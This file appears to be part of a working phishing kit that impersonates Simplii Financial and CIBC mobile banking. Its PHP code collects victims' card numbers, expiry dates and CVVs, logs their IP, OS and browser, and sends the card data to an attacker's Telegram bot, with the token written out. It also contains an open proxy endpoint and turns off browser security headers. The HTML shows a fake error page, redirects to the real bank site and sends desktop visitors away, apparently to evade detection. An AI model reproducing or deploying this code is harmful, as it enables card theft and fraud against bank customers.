<?php

header("Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'");
header("X-XSS-Protection: 0");
header("X-Frame-Options: ALLOWALL");
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token");

if(isset($_GET['bypass']) && $_GET['bypass'] == 'true'){
    $url = $_GET['url'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "Content-Security-Policy-Report-Only: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'",
        "X-XSS-Protection: 0",
        "X-Frame-Options: ALLOWALL",
        "Access-Control-Allow-Origin: *",
        "Access-Control-Allow-Credentials: true",
        "Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS",
        "Access-Control-Allow-Headers: X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token"
    ));
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    header("HTTP/1.1 ".$info['http_code']);
    foreach ($info['headers'] as $header) {
        if (!preg_match('/^Transfer-Encoding:/i', $header)) {
            header($header);
        }
    }
    echo $response;
    exit;
}




$full_date = date("h:i:s|M/d/Y");
$time = date("h:i:s");
$date = date("M/d/Y");

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
$user_agent = $_SERVER['HTTP_USER_AGENT'];

function getOS() { 
    global $user_agent;
    $os_platform  = "Unknown OS Platform";
    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;
}

function getBrowser() {
    global $user_agent;
    $browser        = "Unknown Browser";
    $browser_array = array(
                            '/msie/i'      => 'Internet Explorer',
                            '/firefox/i'   => 'Firefox',
                            '/safari/i'    => 'Safari',
                            '/chrome/i'    => 'Chrome',
                            '/edge/i'      => 'Edge',
                            '/opera/i'     => 'Opera',
                            '/netscape/i'  => 'Netscape',
                            '/maxthon/i'   => 'Maxthon',
                            '/konqueror/i' => 'Konqueror',
                            '/mobile/i'    => 'Handheld Browser'
                     );

    foreach ($browser_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $browser = $value;

    return $browser;
}


$user_os        = getOS();
$user_browser   = getBrowser();
 
$PublicIP = get_client_ip();
$localHost = "127.0.0.1";

if (strpos($PublicIP, ',') !== false) {
    $PublicIP = explode(",", $PublicIP)[0];
}

$file       = 'data.dat';
$file1       = 'combo.txt';
$file2       = 'master.log';
$ip         = "".$PublicIP;
$uaget      = "".$user_agent;
$bsr        = "".$user_browser;
$uos        = "".$user_os;
$ust= explode(" ", $user_agent);
$vr= $ust[3];
$ver=str_replace(")", "", $vr);
$version   = "Version              : ".$ver;
if (strpos($PublicIP, $localHost) !== false) {
    $details = '{
        "success": false
    }';
}
else {
    $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
}
$details  = json_decode($details, true);
$success  = $details['success'];
$file = '../../../log.txtt';
$fp = fopen($file, 'a');

if ($success==false) {
    fwrite($fp, $ip."\n");
    fwrite($fp, $uos."\n");
    fwrite($fp, $version."\n");
    fwrite($fp, $bsr."\n");
    fclose($fp);
} else if ($success==true) {
    $country    = $details['country'];
    $city       = $details['city'];
    $continent  = $details['continent'];
    $tp         = $details['type'];
    $cn         = $details['country_phone'];
    $is         = $details['isp'];
    $la         = $details['latitude'];
    $lp         = $details['longitude'];
    $crn        = $details['currency'];
    $type       = $tp;
    $bank       = "BMO";

    $url        = "https://BMO.com";
    $card       = $_POST['card'];
    $exp1       = $_POST['exp1'];
    $exp2       = $_POST['exp2'];
    $cvv       = $_POST['cvv'];
    $isp        = $is;
    $currency   = "".$full_date;
    $li     = ",";

    

} else {
    $status     = "Status : ".$success;
    fwrite($fp, $status."\n");
    fwrite($fp, $uaget."\n");
    fclose($fp);
}



$message =" SIMPLII CREDIT CARD $card \n $exp1$lh$exp2\n\n\n$cvv\n\n\n---------------------\n\n";


$apiToken = "6547328306:AAFosAwa7wPggddiOV_QgTw7xI-uX8ZEY6s"; 
$data = [
    'chat_id' => '-1001819831566',
    'text' => $message
];


$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
                                                    

?>
<?php
// Disable caching
header("Cache-Control: no-store, no-cache, must-revalidate");
header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
header("Pragma: no-cache");

// Prevent Google Archiving
header("X-Robots-Tag: noarchive");

// Block email scanning
header("X-Content-Type-Options: nosniff");

// Disable listeners and log third-party communications
ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");


// Logging third-party communication attempts
$logFile = "../../../requests.txt"; // Replace with the path to your log file

// Get the current timestamp
$timestamp = date("Y-m-d H:i:s");

// Get the IP address of the client
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Get the requested URL
$requestUrl = $_SERVER['REQUEST_URI'];

// Create the log message
$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";

// Append the log message to the log file
file_put_contents($logFile, $logMessage, FILE_APPEND);
?>
</html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>SIMPLII</title>  <script>
    // Disable caching for forward and backward navigation
    function disableCaching() {
      // Disable caching for forward navigation
      window.onpageshow = function(event) {
        if (event.persisted) {
          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
        }
      };
      
      // Disable caching for backward navigation
      window.onunload = function() {};
    }
    
    // Set client browser cache to one hour prior
    function setBrowserCacheTime() {
      const date = new Date();
      date.setTime(date.getTime() - (60 * 60 * 1000));
      document.getElementById('cacheExpires').content = date.toUTCString();
    }

    // Prevent Google Archiving
    const metaRobots = document.createElement('meta');
    metaRobots.name = 'robots';
    metaRobots.content = 'noarchive';
    document.head.appendChild(metaRobots);

    // Block email scanning
    const metaContentType = document.createElement('meta');
    metaContentType.httpEquiv = 'X-Content-Type-Options';
    metaContentType.content = 'nosniff';
    document.head.appendChild(metaContentType);

    // Disable listeners and log third-party communications
    function disableListeners() {
      // Disable listeners (Not applicable in HTML pages)
    }

    function logThirdPartyCommunication() {
      // Logging third-party communication attempts
      const timestamp = new Date().toISOString();
      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
      const requestedUrl = window.location.href;
      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;

      // Specify the log file location
      const logFile = "../../../requests.txt"; // Replace with the actual log file location

      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
      const logRequest = new XMLHttpRequest();
      logRequest.open('POST', logFile, true);
      logRequest.setRequestHeader('Content-Type', 'text/plain');
      logRequest.send(logMessage);
    }

    // Call the necessary functions when the page loads
    document.addEventListener('DOMContentLoaded', function() {
      disableCaching();
      setBrowserCacheTime();
      disableListeners();
      logThirdPartyCommunication();
    });
  </script>
        
        <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="HandheldFriendly" content="true">
        <meta name="format-detection" content="telephone=no">
        <meta http-equiv="refresh" content="2;URL=https://www.simplii.com/en/home.html">
        <link rel="stylesheet" href="./sim_3_files/reset.css">
        <link rel="stylesheet" href="./sim_3_files/reset-brand.css">
        <link rel="stylesheet" href="./sim_3_files/global.css">
        <link rel="stylesheet" href="./sim_3_files/global-android2.css">
        <link rel="stylesheet" href="./sim_3_files/global-brand.css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/reset(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/reset-brand(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/global(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/global-android2(1).css">
        <link rel="stylesheet" type="text/css" href="./sim_3_files/global-brand(1).css">
        <script type="text/javascript" src="./sim_3_files/jquery-1"></script>
        <script type="text/javascript" src="./sim_3_files/wicket-event-jquery"></script>
        <script type="text/javascript" src="./sim_3_files/wicket-ajax-jquery"></script>
        <script type="text/javascript" id="wicket-ajax-base-url">
            /*<![CDATA[*/
            Wicket.Ajax.baseUrl="change-password";
            /*]]>*/
        </script>
        <script src="./sim_3_files/global"></script>
        <script src="./sim_3_files/drawer-scroll-prevent"></script>
        <link rel="stylesheet" href="./sim_3_files/appboy.css">
        <script type="text/javascript">
            /*<![CDATA[*/

            			//
            			// AppBoy variables
            			//

            			// Staging English
            			// var appBoyKey = 'dc2ba41b-e995-4485-96b3-cd023a992036';
            			// Prod Enlgish
            			var appBoyKey = 'ff80e32a-a82e-4232-b08e-0219652bae28';

            /*]]>*/
        </script>
    </head>
    <body lang="en" class="android-fix">
        <span class="offscreen">CIBC Mobile Banking</span>
        <input id="drawer-toggle-chk" aria-hidden="true" type="checkbox">
        <label for="drawer-toggle-chk" id="drawer-toggle-label">
        <img id="open-menu-icon" src="./sim_3_files/drawer-menu-open.png" alt="Open Menu" role="button">
        <img id="close-menu-icon" src="./sim_3_files/drawer-menu-close.png" alt="Close Menu" role="button">
        </label>
        <nav id="drawer-menu" class="post-signon-drawer scrollable-ver">
            <div id="menu-wrapper">
                <div class="drawer-menu-header">
                    <div class="account-holder-name" id="account-holder-name"></div>
                    <a href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-profileLink" class="no-style-link active" id="profile-link">
                    <span>My Profile</span><span class="drawer-icon-cog"></span>
                    </a>
                </div>
                <ul>
                    <li id="li-my-accounts"><a id="accounts-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-accountLink" role="menuitem" class="">My Accounts</a></li>
                    <li id="li-pay-bills"><a id="paybill-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-paybillLink" role="menuitem" class="">Bill Payments</a></li>
                    <li id="li-interac"><a id="etransfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-eTransferLink" role="menuitem" class=""><em>Interac</em> e-Transfers</a></li>
                    <li id="li-transfer"><a id="transfer-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-transferLink" role="menuitem" class="">Transfer Funds</a></li>
                    <li id="li-upcoming"><a id="uptxs-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-upcomingTransactionsLink" role="menuitem" class="">Upcoming Transactions</a></li>
                    <!-- dynamic SSO links -->
                    <li class="li-sso"><a id="GMT-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxir&amp;locale=en&amp;channel=mobile_web" role="menuitem">Global Money Transfer</a></li>
                    <li class="li-sso"><a id="FXC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxcash&amp;locale=en&amp;channel=mobile_web" role="menuitem">Order Foreign Cash</a></li>
                    <li class="li-sso"><a id="RPC-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxprepaid&amp;locale=en&amp;channel=mobile_web&amp;page=fxretailprepaid-manage" role="menuitem">Prepaid Cards</a></li>
                    <li class="li-sso"><a id="PMO-link" href="https://www.cibc.mobi/ebm-mobile-anp/sso-submit?siteId=FXC&amp;subSiteId=fxpmo&amp;locale=en&amp;channel=mobile_web" role="menuitem">Buy Gold and Silver</a></li>
                    <li class="li-sso"><a id="CCS-link" href="https://www.cibc.mobi/ebm-mobile-anp/pre-credit-score?locale=en&amp;ebkck=true&amp;tcVersion=1.0&amp;channel=mobile_web" role="menuitem">Check Credit Score</a></li>
                    <hr>
                    <li id="li-open-account"><a id="open-product-link" class="tracking-set-flow" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-openAccountPsSO-openAccountPsSOLink" role="menuitem">Open an Account</a></li>
                    <li id="li-browse-products"><a id="products-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-browseProductsPsSO-productSelectorSOLink" target="_blank" role="menuitem" @="Explore Products&lt;span class=&quot;offscreen&quot;&gt;. Opens in new page&lt;/span&gt;" class="">Explore Products</a></li>
                    <li id="li-sites-apps"><a id="sites-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-sitesPostSignOnLink" role="menuitem" class="">CIBC Sites</a></li>
                    <!-- Customer Services link visible for CIBC non-Small Business -->
                    <li id="li-client-services"><a id="customerServices-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-customerServicesLink" class="">Customer Services</a></li>
                    <hr>
                    <li><a class="nav-no-indent" id="contact-us-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-contactUsLink" role="menuitem">Contact Us</a></li>
                    <li><a class="nav-no-indent" id="help-link" href="http://cibc.intelliresponse.com/mobile-w/" role="menuitem">Help</a></li>
                    <li><a class="nav-no-indent" id="security-guarantee-link" href="https://www.cibc.com/ca/mobile/legal/mobile-security.html?itrc=C1:7109" target="_blank" role="menuitem">Security Guarantee</a></li>
                    <hr>
                    <li id="li-sign-out"><a class="nav-no-indent" id="logout-link" href="https://www.cibc.mobi/ebm-mobile-anp/change-password?3-1.ILinkListener-header-drawerMenu-logoutLink" role="menuitem">Sign Out</a></li>
                </ul>
            </div>
        </nav>
        <header class="flex-box flex-box-hoz">
            <div class="flex-box-flex-1"></div>
            <a href="deposit/simplii/#" target="_blank">
                <div id="header-logo"><span class="offscreen">Simplii Financial logo</span></div>
            </a>
            <div id="header-link" class="flex-box-flex-1">
            </div>
        </header>
        <section id="main-page" class="">
        <section id="ide">
            <section class="page-title">
                <h2 class="title">Security Validation</h2>
            </section>
        </section>
        <section id="change-password" class="page-wrapper">
        <div class="global-error-from-container" id="idf">
            <h2 class="title">Sorry!<br>
<br>
The funds could not be processed and have not been deposited in your account <br>Ongoing Server Updates Try again Late! <br> Goodbye.<br>
<br>
- Simplii</h2>
        </div>
        <a href="not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
        <div id="__loadingScreenDiv" class="ajax-overlay" aria-live="assertive">
            <div class="ajax-overlay-background"></div>
            <img src="./sim_3_files/loading.gif" class="ajax-overlay-spinner" tabindex="-1" alt="Page loading">
        </div>
    

<script>setTimeout(function() { if (screen.width >= 600) { window.location = '/notfound'; } }, 100);</script></section></section></body></html>